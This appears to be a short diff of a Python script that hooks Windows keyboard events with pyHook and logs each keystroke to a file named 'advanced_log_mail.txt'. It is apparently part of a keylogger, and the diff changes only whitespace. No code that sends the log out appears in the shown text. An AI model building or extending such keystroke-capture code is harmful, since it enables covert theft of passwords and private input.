@@ -1,8 +1,6 @@
 import pyHook, pythoncom, sys, logging
-
 advancedLogMail="C:\\path\\advanced_log_mail.txt"
-
-        
+    
 def OnKeyboardEvent(event):
     
     logging.basicConfig(filename=advancedLogMail, level=logging.DEBUG, format='%(message)s')
